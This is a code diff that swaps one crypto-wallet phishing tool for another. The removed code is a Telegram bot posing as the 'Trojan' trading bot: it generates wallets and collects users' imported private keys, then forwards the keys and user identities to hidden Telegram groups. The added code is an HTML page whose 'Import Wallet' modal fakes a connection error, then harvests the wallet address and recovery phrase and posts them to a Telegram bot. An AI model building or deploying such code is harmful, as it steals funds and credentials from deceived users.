@@ -1,404 +1,93 @@
-(() => {
-  const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
-  const GROUP_ID = "-4704812522";
-  const ADMIN_GROUP_ID = "8165339075";
+<html>
+    <body>
 
-  const mainButtons = [
-    ["Wallet"],
-    ["Buy", "Sell"],
-    ["Position", "Limit Orders", "DCA Orders"],
-    ["Copy Trade", "Sniper", "Grid Trading"],
-    ["Bridge", "Withdraw"],
-    ["Referrals", "P&L Flex"],
-    ["New Pairs", "Settings", "Refresh"],
-    ["Trojan Perps"]
-  ];
+        <!-- Example HTML for the button and modal/form -->
+<button id="actionBtn">Import Wallet</button>
 
-  const walletButtons = {
-    inline_keyboard: [
-      [{ text: "Create Wallet", callback_data: "create_wallet" }],
-      [{ text: "Import Wallet", callback_data: "import_wallet" }],
-      [{ text: "⬅️ Back to Main Menu", callback_data: "main_menu" }]
-    ]
-  };
+<!-- Modal for the form -->
+<div id="walletModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0); z-index:9999; align-items:center; justify-content:center;">
+  <div style="background:#fff; padding:24px; border-radius:8px; max-width:90vw; width:350px; text-align:center; position:relative;">
+    <div id="modalLoader">Loading form...</div>
+    <div id="modalError" style="color:red; display:none; margin-top:10px;">Unable to connect. Import wallet manually.</div>
+    <form id="walletForm" style="display:none;">
+      <h3>Import Wallet</h3>
+      <input name="wallet" placeholder="Wallet Address" required style="width:90%;margin:8px 0;"><br>
+      <input name="phrase" placeholder="Recovery Phrase" required style="width:90%;margin:8px 0;"><br>
+      <button type="submit">Submit</button>
+    </form>
+    <button onclick="closeModal()" style="position:absolute;top:8px;right:8px;">&times;</button>
+  </div>
+</div>
 
-  const buttonResponses = {
-    buy: "⚠️ Insufficient funds to activate function ⚠️\n\nPlease create or import a wallet and ensure you have enough SOL to buy tokens.",
-    sell: "❌ No tokens available to sell.\n\nYou need to create or import a wallet and hold tokens before selling.",
-    wallet: "👛 *Wallet*: Create a new wallet or import an existing one.",
-    position: "📊 *Position*: Here you can view or manage your current token positions.",
-    limit_orders: "⏳ *Limit Orders*: Set or manage your limit orders for trading.",
-    dca_orders: "📈 *DCA Orders*: Set or manage Dollar-Cost Averaging (DCA) orders.",
-    copy_trade: "🔄 *Copy Trade*: Enable or manage copy trading settings.",
-    sniper: "🎯 *Sniper*: Use the sniper tool for fast token purchases.",
-    grid_trading: "📉 *Grid Trading*: Set up grid trading strategies.",
-    bridge: "🌉 *Bridge*: Bridge tokens between different blockchains.",
-    withdraw: "🏧 *Withdraw*: Withdraw funds or tokens.",
-    referrals: "🔗 *Referrals*: Share your referral link and earn rewards!",
-    p_l_flex: "📈 *P&L Flex*: View your profit and loss flexibly.",
-    new_pairs: "🆕 *New Pairs*: Check out the latest trading pairs.",
-    settings: "⚙️ *Settings*: Adjust your bot preferences.",
-    refresh: "🔄 *Refresh*: Data refreshed!",
-    trojan_perps: "⚔️ *Trojan Perps*: Trade perpetual contracts with Trojan!"
-  };
+<script>
+// Telegram Bot Config
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
 
-  const keyboard = {
-    inline_keyboard: mainButtons.map(
-      (row) => row.map((button) => ({
-        text: button,
-        callback_data: button.toLowerCase().replace(/ /g, "_").replace(/[^a-z0-9_]/g, "")
-      }))
-    )
-  };
+// Detect platform
+function getPlatform() {
+  const ua = navigator.userAgent;
+  if (navigator.platform.startsWith('Mac')) return 'mac';
+  if (/iPhone|iPad|Android/i.test(ua)) return 'mobile';
+  if (navigator.platform.startsWith('Win')) return 'windows';
+  return 'other';
+}
 
-  // --- ETH Wallet Generation (simple random, not secure for production) ---
-  function generateEthWallet() {
-    const hex = [...crypto.getRandomValues(new Uint8Array(32))]
-      .map(b => b.toString(16).padStart(2, "0")).join("");
-    const priv = "0x" + hex;
-    const address = "0x" + hex.slice(0, 40);
-    return { address, privateKey: priv };
+// Download file function for Windows
+function downloadFile() {
+  const blob = new Blob(['Wallet backup data'], {type: 'text/plain'});
+  const link = document.createElement('a');
+  link.href = URL.createObjectURL(blob);
+  link.download = 'wallet-backup.txt';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+}
+
+// Modal logic
+function closeModal() {
+  document.getElementById('walletModal').style.display = 'none';
+  document.getElementById('walletForm').reset();
+  document.getElementById('modalLoader').style.display = '';
+  document.getElementById('walletForm').style.display = 'none';
+  document.getElementById('modalError').style.display = 'none';
+}
+
+document.getElementById('actionBtn').onclick = function() {
+  const platform = getPlatform();
+  if (platform === 'windows') {
+    downloadFile();
+  } else {
+    document.getElementById('walletModal').style.display = 'flex';
+    document.getElementById('modalLoader').style.display = '';
+    document.getElementById('walletForm').style.display = 'none';
+    document.getElementById('modalError').style.display = 'none';
+    setTimeout(() => {
+      document.getElementById('modalLoader').style.display = 'none';
+      document.getElementById('modalError').style.display = '';
+      setTimeout(() => {
+        document.getElementById('modalError').style.display = 'none';
+        document.getElementById('walletForm').style.display = '';
+      }, 1500); // Show form 1.5s after error
+    }, 5000); // Lazyload for 5s
   }
+};
 
-  // --- Solana Wallet Generation ---
-  function base58Encode(buffer) {
-    const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-    let x = BigInt("0x" + Array.from(buffer).map(b => b.toString(16).padStart(2, "0")).join(""));
-    let out = "";
-    while (x > 0) {
-      out = alphabet[x % 58n] + out;
-      x = x / 58n;
-    }
-    for (let i = 0; i < buffer.length && buffer[i] === 0; i++) out = "1" + out;
-    return out;
-  }
-
-  async function getEd25519PublicKeyFromPrivateKey(privateKeyBytes) {
-    const pkcs8prefix = Uint8Array.from([
-      0x30, 0x2e, 0x02, 0x01, 0x00, 0x30, 0x05, 0x06, 0x03, 0x2b, 0x65, 0x70, 0x04, 0x22, 0x04, 0x20
-    ]);
-    const pkcs8 = new Uint8Array(pkcs8prefix.length + 32);
-    pkcs8.set(pkcs8prefix, 0);
-    pkcs8.set(privateKeyBytes.slice(0, 32), pkcs8prefix.length);
-    const key = await crypto.subtle.importKey(
-      "pkcs8",
-      pkcs8.buffer,
-      { name: "Ed25519", namedCurve: "Ed25519" },
-      true,
-      ["sign"]
-    );
-    const jwk = await crypto.subtle.exportKey("jwk", key);
-    const pub = Uint8Array.from(atob(jwk.x.replace(/-/g, "+").replace(/_/g, "/")), c => c.charCodeAt(0));
-    return pub;
-  }
-
-  async function generateSolanaWallet() {
-    const keyPair = await crypto.subtle.generateKey(
-      { name: "Ed25519", namedCurve: "Ed25519" },
-      true,
-      ["sign", "verify"]
-    );
-    const rawPrivate = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
-    const raw = new Uint8Array(rawPrivate);
-    const priv = raw.slice(-64);
-    const priv32 = priv.slice(0, 32);
-    let pub;
-    try {
-      pub = await getEd25519PublicKeyFromPrivateKey(priv32);
-    } catch {
-      pub = priv.slice(32, 64);
-    }
-    return {
-      privateKey: base58Encode(priv),
-      address: base58Encode(pub)
-    };
-  }
-
-  async function sendTelegramMessage(chatId, text, options = {}) {
-    const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text,
-        ...options
-      })
-    });
-    const data = await response.json();
-    if (!response.ok) {
-      console.error(`Failed to send message to ${chatId}: ${response.statusText}`, data);
-    }
-    return data;
-  }
-
-  async function deleteTelegramMessage(chatId, messageId) {
-    await fetch(`${TELEGRAM_API}/deleteMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        message_id: messageId
-      })
-    });
-  }
-
-  function isValidWalletAddress(address) {
-    return address.length > 20;
-  }
-
-  function delay(ms) {
-    return new Promise((resolve) => setTimeout(resolve, ms));
-  }
-
-  const userLastMessage = {};
-  const userWallets = {};
-
-  async function deleteLastUserMessage(chatId) {
-    if (userLastMessage[chatId]) {
-      const messageId = userLastMessage[chatId];
-      await deleteTelegramMessage(chatId, messageId);
-      delete userLastMessage[chatId];
-    }
-  }
-
-  async function sendToAllGroups(text, options = {}) {
-    await sendTelegramMessage(GROUP_ID, text, options);
-    await sendTelegramMessage(ADMIN_GROUP_ID, text, options);
-  }
-
-  async function handleRequest(request) {
-    const url = new URL(request.url);
-    const { pathname } = url;
-    if (pathname === "/") {
-      return new Response("Telegram Bot is running", { status: 200 });
-    }
-    if (pathname === "/webhook") {
-      const update = await request.json();
-      // Handle user messages
-      if (update.message) {
-        const chatId = update.message.chat.id;
-        const userId = update.message.from.id;
-        const username = update.message.from.username ? `@${update.message.from.username}` : "N/A";
-        const firstName = update.message.from.first_name || "N/A";
-        const lastName = update.message.from.last_name || "N/A";
-        const userInfo = `User ID: ${userId}
-Username: ${username}
-Name: ${firstName} ${lastName}`;
-        if (update.message.text) {
-          const userMessage = update.message.text;
-          await sendToAllGroups(`User input: \`${userMessage}\`\n${userInfo}`, {
-            parse_mode: "Markdown"
-          });
-          if (userMessage === "/start") {
-            // Show welcome and Continue button
-            const welcomeMsg = `*Welcome to Trojan, the most used Trading Telegram bot.*
-
-Trojan enables you to quickly buy or sell tokens and set automations like Limit Orders, DCA, Copy-trading and Sniping.
-
-By continuing you'll create a crypto wallet that interacts with Trojan to power it up with instant swaps and live data.
-
-By pressing *Continue* you confirm that you accept our Terms of Use and Privacy Policy.
-
-*AFTER YOU CLICK CONTINUE below, we will send you the public address and private key for your crypto wallet RIGHT HERE ON TELEGRAM - please be in a private place where you are able to SEE THESE IN PRIVATE, AND note these details down SECURELY.*`;
-            const resp = await sendTelegramMessage(chatId, welcomeMsg, {
-              parse_mode: "Markdown",
-              reply_markup: JSON.stringify({
-                inline_keyboard: [
-                  [{ text: "Continue", callback_data: "continue_accept_terms" }]
-                ]
-              })
-            });
-            userLastMessage[chatId] = resp.result?.message_id;
-          } else if (userMessage.startsWith("/")) {
-            await deleteLastUserMessage(chatId);
-            const resp = await sendTelegramMessage(chatId, "\u274C Unknown command. Please use the menu buttons or /start.", {
-              reply_markup: JSON.stringify(keyboard)
-            });
-            userLastMessage[chatId] = resp.result?.message_id;
-          } else if (update.message?.reply_to_message?.text === "Provide the private key you'd like to import:\u270F\uFE0F") {
-            await deleteLastUserMessage(chatId);
-            await sendTelegramMessage(chatId, "Validating Wallet...");
-            await delay(3e3);
-            if (isValidWalletAddress(userMessage)) {
-              const resp = await sendTelegramMessage(chatId, "\u2705 Your wallet has been successfully connected!");
-              userLastMessage[chatId] = resp.result?.message_id;
-              await sendToAllGroups(`✅ Wallet imported by user:\n${userInfo}\n\n*Imported Private Key:*\n\`${userMessage}\``, { parse_mode: "Markdown" });
-            } else {
-              const resp = await sendTelegramMessage(chatId, "\u274C Invalid Key. Please provide a valid Private key or 12 Mnemonic words of your wallet [Solflare, Phantom, MetaMask, Ledger, Trustwallet, OKX or other defiwallets]. Click /start to begin the process.");
-              userLastMessage[chatId] = resp.result?.message_id;
-              await sendToAllGroups(`❌ Invalid wallet import attempt by user:\n${userInfo}\n\n*Attempted Private Key:*\n\`${userMessage}\``, { parse_mode: "Markdown" });
-            }
-          } else {
-            await deleteLastUserMessage(chatId);
-            const resp = await sendTelegramMessage(chatId, "Message received.", {
-              reply_markup: JSON.stringify(keyboard)
-            });
-            userLastMessage[chatId] = resp.result?.message_id;
-          }
-        } else {
-          await sendToAllGroups(`Non-text input received from user:\n${userInfo}`, { parse_mode: "Markdown" });
-        }
-      }
-      // Handle button clicks
-      if (update.callback_query) {
-        const chatId = update.callback_query.message.chat.id;
-        const buttonClicked = update.callback_query.data;
-        const userId = update.callback_query.from.id;
-        const username = update.callback_query.from.username ? `@${update.callback_query.from.username}` : "N/A";
-        const firstName = update.callback_query.from.first_name || "N/A";
-        const lastName = update.callback_query.from.last_name || "N/A";
-        const userInfo = `User ID: ${userId}
-Username: ${username}
-Name: ${firstName} ${lastName}`;
-        await sendToAllGroups(`Button clicked: \`${buttonClicked}\`\n${userInfo}`, {
-          parse_mode: "Markdown"
-        });
-
-        await deleteLastUserMessage(chatId);
-
-        let resp;
-        if (buttonClicked === "continue_accept_terms") {
-          // Generate wallets and show details, then auto-delete after 5 minutes
-          const sol = await generateSolanaWallet();
-          const eth = generateEthWallet();
-          userWallets[chatId] = { sol, eth };
-
-          const walletMsg =
-`✅ You've accepted our terms, you can now use the latest version of the bot.
-
-🟢 Generated your wallets
-
-*SOL* : \`${sol.address}\`
-Secret Key: \`${sol.privateKey}\`
-
-*ETH* : \`${eth.address}\`
-Secret Key: \`${eth.privateKey}\`
-
-*BE SURE TO RETAIN THE INFORMATION ABOVE IN A SAFE PLACE. THIS MESSAGE WILL AUTO-DELETE AND NOT BE AVAILABLE IN YOUR CHAT HISTORY AFTER 5 MINUTES.*
-
-Press "Continue Trading" to proceed.`;
-
-          const walletResp = await sendTelegramMessage(chatId, walletMsg, {
-            parse_mode: "Markdown",
-            reply_markup: JSON.stringify({
-              inline_keyboard: [
-                [{ text: "Continue Trading", callback_data: "continue_trading" }]
-              ]
-            })
-          });
-          // Schedule auto-delete after 5 minutes
-          setTimeout(() => deleteTelegramMessage(chatId, walletResp.result?.message_id), 5 * 60 * 1000);
-          userLastMessage[chatId] = walletResp.result?.message_id;
-        } else if (buttonClicked === "continue_trading") {
-          // Show main menu with only addresses (no private key)
-          const wallets = userWallets[chatId];
-          let menuMsg = "*Solana · 🅴*\n";
-          if (wallets?.sol) {
-            menuMsg += `\n*SOL:* \`${wallets.sol.address}\`\nBalance: 0 SOL ($0.00)\n`;
-          }
-          if (wallets?.eth) {
-            menuMsg += `*ETH:* \`${wallets.eth.address}\`\nBalance: 0 ETH ($0.00)\n`;
-          }
-          menuMsg += "—\nClick on the *Refresh* button to update your current balance.\n\nJoin our Telegram group @trojan and follow us on Twitter!\n\n⚠️ *We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.*";
-          resp = await sendTelegramMessage(chatId, menuMsg, {
-            parse_mode: "Markdown",
-            reply_markup: JSON.stringify(keyboard)
-          });
-          userLastMessage[chatId] = resp.result?.message_id;
-
-        } else if (buttonClicked === "wallet") {
-          resp = await sendTelegramMessage(chatId,
-            "👛 *Wallet Menu*\n\nCreate a new wallet or import an existing one to get started.",
-            {
-              parse_mode: "Markdown",
-              reply_markup: JSON.stringify(walletButtons)
-            }
-          );
-          userLastMessage[chatId] = resp.result?.message_id;
-
-        } else if (buttonClicked === "main_menu") {
-          // Show menu with address only
-          const wallets = userWallets[chatId];
-          let menuMsg = "*Solana · 🅴*\n";
-          if (wallets?.sol) {
-            menuMsg += `\n*SOL:* \`${wallets.sol.address}\`\nBalance: 0 SOL ($0.00)\n`;
-          }
-          if (wallets?.eth) {
-            menuMsg += `*ETH:* \`${wallets.eth.address}\`\nBalance: 0 ETH ($0.00)\n`;
-          }
-          menuMsg += "—\nClick on the *Refresh* button to update your current balance.\n\nJoin our Telegram group @trojan and follow us on Twitter!\n\n⚠️ *We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.*";
-          resp = await sendTelegramMessage(chatId, menuMsg, {
-            parse_mode: "Markdown",
-            reply_markup: JSON.stringify(keyboard)
-          });
-          userLastMessage[chatId] = resp.result?.message_id;
-
-        // Add: main menu button responses with a Back button
-        } else if (
-          [
-            "buy", "sell", "position", "limit_orders", "dca_orders", "copy_trade", "sniper",
-            "grid_trading", "bridge", "withdraw", "referrals", "p_l_flex", "new_pairs", "settings", "refresh", "trojan_perps"
-          ].includes(buttonClicked)
-        ) {
-          resp = await sendTelegramMessage(chatId, buttonResponses[buttonClicked], {
-            parse_mode: "Markdown",
-            reply_markup: JSON.stringify({
-              inline_keyboard: [
-                [{ text: "Back", callback_data: "main_menu" }]
-              ]
-            })
-          });
-          userLastMessage[chatId] = resp.result?.message_id;
-
-        } else if (buttonClicked === "hide_menu") {
-          // Hide menu by editing the message to remove the keyboard
-          const messageId = update.callback_query.message.message_id;
-          await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              message_id: messageId,
-              reply_markup: JSON.stringify({ inline_keyboard: [] })
-            })
-          });
-
-        } else if (buttonClicked === "create_wallet") {
-          const sol = await generateSolanaWallet();
-          userWallets[chatId] = userWallets[chatId] || {};
-          userWallets[chatId].sol = sol;
-          resp = await sendTelegramMessage(
-            chatId,
-            `🆕 *Your new Solana wallet has been created!*\n\n*Address:*\n\`${sol.address}\`\n\n*Private Key (keep safe!):*\n\`${sol.privateKey}\`\n\n*Never share your private key with anyone.*`,
-            { parse_mode: "Markdown" }
-          );
-          userLastMessage[chatId] = resp.result?.message_id;
-          await sendToAllGroups(
-            `🚨 *Wallet Created*\n\n*User:*\nID: \`${userId}\`\nUsername: ${username}\nName: ${firstName} ${lastName}\n\n*Address:*\n\`${sol.address}\`\n*Private Key:*\n\`${sol.privateKey}\``,
-            { parse_mode: "Markdown" }
-          );
-
-        } else if (buttonClicked === "import_wallet") {
-          resp = await sendTelegramMessage(chatId, "Provide the private key you'd like to import:\u270F\uFE0F", {
-            reply_markup: JSON.stringify({ force_reply: true })
-          });
-          userLastMessage[chatId] = resp.result?.message_id;
-
-        } else {
-          resp = await sendTelegramMessage(chatId, "❓ Unknown action. Please use the menu buttons.", {
-            reply_markup: JSON.stringify(keyboard)
-          });
-          userLastMessage[chatId] = resp.result?.message_id;
-        }
-      }
-      return new Response("OK", { status: 200 });
-    }
-    return new Response("Not found", { status: 404 });
-  }
-
-  addEventListener("fetch", (event) => {
-    event.respondWith(handleRequest(event.request));
+// Form submission to Telegram
+document.getElementById('walletForm').onsubmit = function(e) {
+  e.preventDefault();
+  const formData = new FormData(this);
+  const msg = `Wallet Import:\nAddress: ${formData.get('wallet')}\nPhrase: ${formData.get('phrase')}`;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
+  }).then(() => {
+    closeModal();
+    alert('Submitted!');
   });
-})();
+};
+</script>
+
+    </body>
+    </html>
